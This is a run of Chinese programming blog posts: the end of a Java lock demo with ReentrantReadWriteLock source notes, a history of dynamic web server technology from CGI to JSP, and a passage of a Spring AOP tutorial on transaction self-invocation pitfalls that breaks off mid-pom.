Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,16,]
Lock by[17],Waiting by[16,18,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,15,]
Lock by[18],Waiting by[17,15,16,]
Lock by[17],Waiting by[15,16,18,]
Lock by[15],Waiting by[16,18,17,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,16,]
Lock by[17],Waiting by[16,18,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,16,]
Lock by[17],Waiting by[16,18,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,16,]
Lock by[17],Waiting by[16,18,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,16,]
Lock by[17],Waiting by[16,18,]
Lock by[16],Waiting by[18,17,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[17,]
Lock by[17],Waiting by[18,]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
Lock by[18],Waiting by[]
cost:193 ms

View Code
 
五 读写锁
 　　读写锁维护了一对锁，一个读锁和一个写锁，通过分离读锁和写锁，使得并发性相比一般的排他锁（同一时刻只允许一个线程进行访问）有了很大的提升。
　　下面我们看下它有啥特性：




特性


说明




公平性选择


支持非公平（默认）和公平的所获取方式，吞吐量还是非公平优于公平




可重入


该锁支持可重进入。
读线程在获取了读锁之后能够再次获取读锁。
写线程在获取了写锁之后能够再次获取写锁。




锁降级


遵循获取写锁、获取读锁在释放写锁的次序，写锁能够降级成读锁。




排他性


当写线程访问时，其他读写线程均被阻塞




　　另外读写锁是采取一个整型变量来维护多种状态。高16位表示读，低16位表示写。

// 偏移位
static final int SHARED_SHIFT   = 16;
static final int SHARED_UNIT    = (1 << SHARED_SHIFT);
// 读写线程允许占用的最大数
static final int MAX_COUNT      = (1 << SHARED_SHIFT) - 1;
// 独占标志
static final int EXCLUSIVE_MASK = (1 << SHARED_SHIFT) - 1;

　　下面从源码中找出这些特性，先看下写锁的实现：

 1 protected final boolean tryAcquire(int acquires) {
 2 
 3     Thread current = Thread.currentThread();
 4     int c = getState();
 5     // 表示独占个数，也就是与低16为进行与运算。
 6     int w = exclusiveCount(c);
 7     if (c != 0) {
 8         // c！=0 且 w==0表示不存在写线程，但存在读线程
 9         if (w == 0 || current != getExclusiveOwnerThread())
10             return false;
11         if (w + exclusiveCount(acquires) > MAX_COUNT)
12             throw new Error("Maximum lock count exceeded");
13         /**
14          * 获取写锁的条件：
15          * 不能存在读线程且当前线程是当前占用锁的线程(这里体现可重入性和排他性)；
16          * 当前占用锁的次数不能超过最大数
17          */
18         setState(c + acquires);
19         return true;
20     }
21     if (writerShouldBlock() ||
22             !compareAndSetState(c, c + acquires))
23         return false;
24     setExclusiveOwnerThread(current);
25     return true;
26 }
27 static int exclusiveCount(int c) { return c & EXCLUSIVE_MASK; }

　　获取读锁源码如下：

protected final int tryAcquireShared(int unused) {
    Thread current = Thread.currentThread();
    int c = getState();
    /**
     * exclusiveCount(c) != 0: 表示有写线程在占用
     * getExclusiveOwnerThread() != current :  当前占用锁的线程不是当前线程。
     * 如果上面两个条件同时满足，则获取失败。
     * 上面表明如果当前线程是拥有写锁的线程可以获取读锁（体现可重入和锁降级）。
     */
    if (exclusiveCount(c) != 0 &&
            getExclusiveOwnerThread() != current)
        return -1;
    int r = sharedCount(c);
    if (!readerShouldBlock() &&
            r < MAX_COUNT &&
            compareAndSetState(c, c + SHARED_UNIT)) {
        if (r == 0) {
            firstReader = current;
            firstReaderHoldCount = 1;
        } else if (firstReader == current) {
            firstReaderHoldCount++;
        } else {
            HoldCounter rh = cachedHoldCounter;
            if (rh == null || rh.tid != getThreadId(current))
                cachedHoldCounter = rh = readHolds.get();
            else if (rh.count == 0)
                readHolds.set(rh);
            rh.count++;
        }
        return 1;
    }
    return fullTryAcquireShared(current);
}

 
********************************************************************************************************************************************************************************************************
动态 Web Server 技术发展历程
动态 Web Server 技术发展历程
开始接触 Java Web 方面的技术，此篇文章是以介绍 Web server 相关技术的演变为主来作为了解 Java servlet 的技术背景，目的是更好的理解 java web 体系。

万维网概述
万维网 WWW （World Wide Web）并非某种特殊的计算机网络，他是一个大规模的、联机式的信息储藏所。英文简称为 Web。万维网是一个分布式的 超媒体（超文本系统的扩充）,通过作用于其上的 HTTP 应用层协议，一台计算机可以轻松的从另一台地理位置不同的计算机获取 Web 资源。
万维网以 客户——服务器 方式工作。浏览器就是一个常见的在用户主机上的万维网客户程序。而万维网所驻留的主机则运行服务器程序，因此这台主机也成为 万维网服务器 （Web Server）。
接下来就是我们文章的主角——Web Server ，和它的的发展历史。

Web Server 的发展历史
静态 Web 服务器
最早的 Web 服务器简单的响应浏览器发送过来的 HTTP 请求，并将储存在服务器上的 HTML 文件返回给浏览器。这样的服务器可以称为静态服务器。它是最初的建站方式。浏览者所看到的每个页面都是建站者上传到服务器的 HTML 文件，这种网站每次增加、删除、修改一个页面，都必须对服务器文件进行一次下载和上传。使用静态服务器的网站的缺点是缺乏交互性、迭代周期长、不易维护。
而与之对应的，也是后来发展出的技术，是动态 Web 服务器技术。

动态 Web 服务器
动态 Web 服务器弥补了静态 Web 服务器功能上的不足，它具有良好的交互性，HTML 文件会自动更新内容而无需手动更新，降低了生产维护成本，和迭代周期。使用静态 Web 服务器的网站页面一般会被称为 网页（Web page），而使用动态 Web 服务器的网站更倾向于被称为 Web 应用（Web application）。
接下来将主要介绍动态 Web 服务器的技术发展历程。

在服务器中集成
在介绍动态 Web 服务器之前，首先我们来看一下，静态 Web 服务器是如何工作的，它的工作过程可以参考下图：

当 HTTP 请求到达服务器后，静态 Web 服务器直接给予响应并返回 HTML 文件。
然后我们再来看一下动态 Web 服务器的实现技术。
由于很多的服务器都是使用 C/C++、Java 等编译型的语言编写，所以实现动态 Web 服务器技术最直观的做法也是最容易考虑到的是，将对 HTML 更新的功能作为扩展 API 集成到服务器程序中，直接由服务器来完成这个任务。这样做的优点是，由于使用 C/C++、Java 编写而成，所以程序的执行效率是很可观的。但是缺点却也很严重，功能模块依赖平台、具体的服务器，如果 API 中的某一模块出错将导致整个服务器崩溃，维护成本高等。


SSI 和 CGI
SSI （Server Side Include） 和 CGI（Common GateWay Interface）是很相似的两种技术，他们并非使用某种特定语言实现的具体程序，而是一种编码标准，是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。当我们需要实现动态 HTML 文档功能时，可以将预先编译好的 CGI/SGI 程序保存到服务器端，当服务器响应客户端请求时可以被调用以处理 HTML 文档。过程可以参考下图：

随着 CGI 技术的兴起和普及，聊天室、文献检索、电子商务、信息查询等各式各样的 Web 应用蓬勃兴起。CGI 技术也有他的缺点，因为每当客户端程序有一个请求时，Web 服务器都需要创建一个新的 CGI 进程，并通过环境变量和标准输入来将生成响应报文所必须的信息传递 CGI 程序。这样的操作是很耗费时间的，同样也很耗费资源。 同时因为 CGI 进程和 Web 服务器是不同的进程，所以二者就很难进行交互。另外 SSI 和 CGI 也很容易受平台的影响。

服务器端动态语言
C/C++ 的强大是毋庸置疑的，所以对于服务器我们采用 C/C++ 实现，这能稳健的确保执行效率。Web 服务器的动态 HTML 文档处理一开始仍是使用 C/C++ 来实现，但是众所皆知，C/C++ 较高的运行速度的代价是开发难度大，维护成本高。于是，人们自然想到了开发迭代速度较快，更易于维护的脚本语言来实现，比如 PHP、Python等。这里不得不提的是专用于 Web 服务器端编程的 PHP （PHP：Hypertext Preprocessor）语言。
起初这门语言只是作为一个由 C 写成的 CGI 二进制库集合出现，用于追踪作者在线简历的访问，他也因此给它命名 “Personal Home Page Tools”。并且 PHP 的一大有点是可以将 PHP 程序嵌入到 HTML 文档中去执行，执行效率比完全生成 HTML 标记的 CGI 程序要高很多。随着越来越多的功能的加入和作者的多次重写，最终使他演变成了一门编程语言。（语言只是工具）

Active Server Pages
Microsoft已开发出一种用于生成称为 Active Server Pages 的动态Web内容的技术,简称 ASP。使用ASP，Web 服务器上的HTML页面可以包含嵌入代码的片段（通常是VBScript或JScript-尽管几乎可以使用任何语言）。在将页面发送到客户端之前，Web服务器将读取并执行此代码。

Server-side JavaScript
Netscape 也有一种服务器端脚本技术，它被称为服务器端 JavaScript，或简称为 SSJS。与 ASP 一样，SSJS 同样允许将代码片段嵌入到 HTML 页面中以生成动态 Web 内容。区别在于 SSJS 使用 JavaScript 作为脚本语言。使用 SSJS，可以预编译网页以提高性能。

Java Server pages
想了解 jsp（Java Server Pages） 那么就不得不说一下和他直接相关的，Java Servlet。
Java Serlvet（Java Server Side applet) 是在服务器端的 Java 程序，他扩展了服务器的功能，通过运行 由 Serlvet 引擎管理的 JVM 来运行 Java 程序而提供动态更新 HTML 的功能 （使用不同的技术来实现类似 CGI 程序的功能，但不完全同于 CGI，Servlet 有自己的约定）。Java Serlvet 的优点很吸引人，具有 Java 语言的优点和平台无关性；因为 Serlvet 在 Web 服务器中运行，所以可以很容易的访问 Web 服务器的资源；支持在 JVM 中运行多线程，每个请求将对应一个 Serlvet 线程，对比 CGI 创建进程的方式将节省很大的时间和空间资源。但是工程师们向来都是抵制麻烦寻找便利的人群，使用 Java Servlet 编写服务器端页面，不可避免的就是再次需要在 Java 代码中嵌入前端 HTML 代码，这给编码体验造成了很大影响，为了实现工程师友好（增加这门技术对工程师的吸引力），于是和 PHP 在 HTML 中嵌入代码相似，Java servlet 也实现这一特性，允许在 HTML 中嵌入 Java 代码。更进一步，将一些 Java 代码封装起来换一种更加易于理解和使用的语法，就产生了 JSP。JSP 真正运行时，是会被 Servlet 容器给编译成 Java Servlet 代码的，所以实际运行的还是 Java 程序。JSP 只是一个工程师友好的中间层。

由于是几个月前写的，已经找不到当时的参考文章了，所以参考资料就不贴了。

作者：何必诗债换酒钱
出处：http://www.cnblogs.com/backwords/p/9680296.html
本博客中未标明转载的文章归作者何必诗债换酒钱和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。

********************************************************************************************************************************************************************************************************
朱晔和你聊Spring系列S1E6：容易犯错的Spring AOP
标题有点标题党了，这里说的容易犯错不是Spring AOP的错，是指使用的时候容易犯错。本文会以一些例子来展开讨论AOP的使用以及使用过程中容易出错的点。
几句话说清楚AOP

有关必要术语：

切面：Aspect，有的地方也叫做方面。切面=切点+增强，表示我们在什么点切入蛋糕，切入蛋糕后我们以什么方式来增强这个点。
切点：Pointcut，类似于查询表达式，通过在连接点运行查询表达式来寻找匹配切入点，Spring AOP中默认使用AspjectJ查询表达式。
增强：Advice，有的地方也叫做通知。定义了切入切点后增强的方式，增强方式有前、后、环绕等等。Spring AOP中把增强定义为拦截器。
连接点：Join point，蛋糕所有可以切入的点，对于Spring AOP连接点就是方法执行。

有关使用方式：

Spring AOP API：这种方式是Spring AOP实现的基石。最老的使用方式，在Spring 1.2中的时候用这种API的方式定义AOP。
注解声明：使用@AspectJ的@Aspect、@Pointcut等注解来定义AOP。现在基本都使用这种方式来定义，也是官方推荐的方式。
配置文件：相比注解声明方式，配置方式有两个缺点，一是定义和实现分离了，二是功能上会比注解声明弱，无法实现全部功能。好处么就是XML在灵活方面会强一点。
编程动态配置：使用AspectJProxyFactory进行动态配置。可以作为注解方式静态配置的补充。

有关织入方式：
织入说通俗点就是怎么把增强代码注入到连接点，和被增强的代码融入到一起。

运行时：Spring AOP只支持这种方式。实现上有两种方式，一是JDK动态代理，通过反射实现，只支持对实现接口的类进行代理，二是CGLIB动态字节码注入方式实现代理，没有这个限制。Spring 3.2之后的版本已经包含了CGLIB，会根据需要选择合适的方式来使用。
编译时：在编译的时候把增强代码注入进去，通过AspjectJ的ajc编译器实现。实现上有两种方式，一种是直接使用ajc编译所有代码，还有一种是javac编译后再进行后处理。
加载时：在JVM加载类型的时候注入代码，也叫做LTW。通过启动程序的时候通过javaagent代理默认的类加载器实现。

使用Spring AOP实现事务的坑
新建一个模块：
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
   <modelVersion>4.0.0</modelVersion>

   <groupId>me.josephzhu</groupId>
   <artifactId>spring101-aop</artifactId>
   <version>0.0.1-SNAPSHOT</version>
   <packaging>jar</packaging>

   <name>spring101-aop</name>
   <description></description>

   <parent>
      <groupId>me.josephzhu</groupId>
      <artifactId>spring101</artifactId>
      <version>0.0.1-SNAPSHOT</version>
   </parent>

   <dependencies>
      <dependency>
         <groupId>org.springframework.boot</groupId>
         <artifactId>spring-boot-starter-aop</artifactId>
      </dependency>
        <dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>1.3.2</version>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
        </dependency>
      <dependency>
         <groupId>com.fasterxml.jackson.core</groupId>
         <artifactId>jackson-databind</artifactId>
         <version>2.9.7</version>
      </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
    </dependencies>

</project>
在这里我们引入了jackson，以后我们会用来做JSON序列化。引入了mybatis启动器，以后我们会用mybstis做数据访问。引入了h2嵌入式数据库，方便本地测试使用。引入了web启动器，之后我们还会来测试一下对web项目的Controller进行注入。
先来定义一下我们的测试数据类：
package me.josephzhu.spring101aop;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.math.BigDecimal;

@Data
@NoArgsConstructor
@AllArgsConstructor
public class MyBean {
    private Long id;
    private String name;
    private Integer age;
    private BigDecimal balance;
}
然后，我们在resources文件夹下创建schema.sql文件来初始化h2数据库：
CREATE TABLE PERSON(
ID BIGINT  PRIMARY KEY AUTO_INCREMENT,
NAME VARCHAR(255),
AGE SMALLINT,
BALANCE DECIMAL
);
还可以在resources文件夹下创建data.sql来初始化数据：
INSERT INTO PERSON (NAME, AGE, BALANCE) VALUES ('zhuye', 35, 1000);
这样程序启动后就会有一个PERSON表，表里有一条ID为1的记录。
通过启动器使用Mybatis非常简单，无需进行任何配置，建一个Mapper接口：
package me.josephzhu.spring101aop;

import org.apache.ibatis.annotations.Insert;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

@Mapper
public interface DbMapper {
    @Select("SELECT COUNT(0) FROM PERSON")
    int personCount();

    @Insert("INSERT INTO PERSON (NAME, AGE, BALANCE) VALUES ('zhuye', 35, 1000)")
    void personInsertWithoutId();

    @Insert("INSERT INTO PERSON (ID, NAME, AGE, BALANCE) VALUES (1,'zhuye', 35, 1000)")
    void personInsertWithId();

    @Select("SELECT * FROM PERSON")
    List<MyBean> getPersonList();

}
这里我们定义了4个方法：

查询表中记录数的方法
查询表中所有数据的方法
带ID字段插入数据的方法，由于程序启动的时候已经初始化了一条数据，如果这里我们再插入ID为1的记录显然会出错，用来之后测试事务使用
不带ID字段插入数据的方法
为了我们可以观察到数据库连接是否被Spring纳入事务管理，我们在application.properties配置文件中设置mybatis的Spring事务日志级别为DEBUG：

logging.level.org.mybatis.spring.transaction=DEBUG
现在我们来创建服务接口：
package me.josephzhu.spring101aop;

import java.time.Duration;
import java.util.List;

public interface MyService {
    void insertData(boolean success);
    List<MyBean> getData(MyBean myBean, int count, Duration delay);
}
定义了插入数据和查询数据的两个方法，下面是实现：
package me.josephzhu.spring101aop;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.Duration;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

@Service
public class MyServiceImpl implements MyService {

    @Autowired
    private DbMapper dbMapper;

    @Transactional(rollbackFor = Exception.class)
    public void _insertData(boolean success){
        dbMapper.personInsertWithoutId();
        if(!success)
            dbMapper.personInsertWithId();
    }

    @Override
    public void insertData(boolean success) {
        try {
            _insertData(success);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("记录数：" + dbMapper.personCount());
    }

    @Override
    public List<MyBean> getData(MyBean myBean, int count, Duration delay) {
        try {
            Thread.sleep(delay.toMillis());
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return IntStream.rangeClosed(1,count)
                .mapToObj(i->new MyBean((long)i,myBean.getName() + i, myBean.getAge(), myBean.getBalance()))
                .collect(Collectors.toList());
    }
}
getData方法我们就不细说了，只是实现了休眠然后根据传入的myBean作为模板组装了count条测试数据返回。我们来重点看一下insertData方法，这就是使用Spring AOP的一个坑了。看上去配置啥的都没问题，但是_insertData是不能生效自动事务管理的。
我们知道Spring AOP使用代理目标对象方式实现AOP，在从外部调用insertData方法的时候其实走的是代理，这个时候事务环绕可以生效，在方法内部我们通过this引用调用_insertData方法，虽然方法外部我们设置了Transactional注解，但是由于走的不是代理调用，Spring AOP自然无法通过AOP增强为我们做事务管理。
我们来创建主程序测试一下：
package me.josephzhu.spring101aop;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.AdviceMode;
import org.springframework.context.annotation.Configuration;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import java.math.BigDecimal;
import java.time.Duration;

@SpringBootApplication
public class Spring101AopApplication implements CommandLineRunner {

   public static void main(String[] args) {
      SpringApplication.run(Spring101AopApplication.class, args);
   }

   @Autowired
   private MyService myService;

   @Override
   public void run(String... args) throws Exception {
      myService.insertData(true);
      myService.insertData(false);
      System.out.println(myService.getData(new MyBean(0L, "zhuye",35, new BigDecimal("1000")),
            5,
            Duration.ofSeconds(1)));
   }
}
在Runner中，我们使用true和false调用了两次insertData方法。后面一次调用肯定会失败，因为_insert方法中会进行重复ID的数据插入。运行程序后得到如下输出：
2018-10-07 09:11:44.605  INFO 19380 --- [           main] m.j.s.Spring101AopApplication            : Started Spring101AopApplication in 3.072 seconds (JVM running for 3.74)
2018-10-07 09:11:44.621 DEBUG 19380 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@2126664214 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will not be managed by Spring
2018-10-07 09:11:44.626 DEBUG 19380 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@775174220 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will not be managed by Spring
记录数：2
2018-10-07 09:11:44.638 DEBUG 19380 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@2084486251 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will not be managed by Spring
2018-10-07 09:11:44.638 DEBUG 19380 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@26418585 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will not be managed by Spring
2018-10-07 09:11:44.642  INFO 19380 --- [           main] o.s.b.f.xml.XmlBeanDefinitionReader      : Loading XML bean definitions from class path resource [org/springframework/jdbc/support/sql-error-codes.xml]
org.springframework.dao.DuplicateKeyException: 
### Error updating database.  Cause: org.h2.jdbc.JdbcSQLException: Unique index or primary key violation: "PRIMARY KEY ON PUBLIC.PERSON(ID)"; SQL statement:
INSERT INTO PERSON (ID, NAME, AGE, BALANCE) VALUES (1,'zhuye', 35, 1000) [23505-197]
2018-10-07 09:11:44.689 DEBUG 19380 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@529949842 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will not be managed by Spring
记录数：3
[MyBean(id=1, name=zhuye1, age=35, balance=1000), MyBean(id=2, name=zhuye2, age=35, balance=1000), MyBean(id=3, name=zhuye3, age=35, balance=1000), MyBean(id=4, name=zhuye4, age=35, balance=1000), MyBean(id=5, name=zhuye5, age=35, balance=1000)]
从日志的几处我们都可以得到结论，事务管理没有生效：

我们可以看到有类似Connection will not be managed by Spring的提示，说明连接没有进入Spring的事务管理。
程序启动的时候记录数为1，第一次调用insertData方法后记录数为2，第二次调用方法如果事务生效方法会回滚记录数会维持在2，在输出中我们看到记录数最后是3。

那么，如何解决这个问题呢，有三种方式：

使用AspjectJ来实现AOP，这种方式是直接修改代码的，不是走代理实现的，不会有这个问题，下面我们会详细说明一下这个过程。
在代码中使用AopContext.currentProxy()来获得当前的代理进行_insertData方法调用。这种方式侵入太强，而且需要被代理类意识到自己是通过代理被访问，显然不是合适的方式。
改造代码，使需要事务代理的方法直接调用，类似：

@Override
@Transactional(rollbackFor = Exception.class)
public void insertData(boolean success) {
    dbMapper.personInsertWithoutId();
    if(!success)
        dbMapper.personInsertWithId();
}
这里还容易犯错的地方是，这里不能对异常进行捕获，否则Spring事务代理无法捕获到异常也就无法实现回滚。
使用AspectJ静态织入进行改造
那么原来这段代码如何不改造实现事务呢？可以通过AspjectJ编译时静态织入实现。整个配置过程如下：
首先在pom中加入下面的配置：
<build>
       <sourceDirectory>${project.build.directory}/generated-sources/delombok</sourceDirectory>
       <plugins>
      <plugin>
         <groupId>org.springframework.boot</groupId>
         <artifactId>spring-boot-maven-plugin</artifactId>
      </plugin>
           <plugin>
               <groupId>org.projectlombok</groupId>
               <artifactId>lombok-maven-plugin</artifactId>
               <version>1.18.0.0</version>
               <executions>
                   <execution>
                       <phase>generate-sources</phase>
                       <goals>
                           <goal>delombok</goal>
                       </goals>
                   </execution>
               </executions>
               <configuration>
                   <addOutputDirectory>false</addOutputDirectory>
                   <sourceDirectory>src/main/java</sourceDirectory>
               </configuration>
           </plugin>
           <plugin>
               <groupId>org.codehaus.mojo</groupId>
               <artifactId>aspectj-maven-plugin</artifactId>
               <version>1.10</version>
               <configuration>
                   <complianceLevel>1.8</complianceLevel>
                   <source>1.8</source>
                   <aspectLibraries>
                       <aspectLibrary>
                           <groupId>org.springframework</groupId>
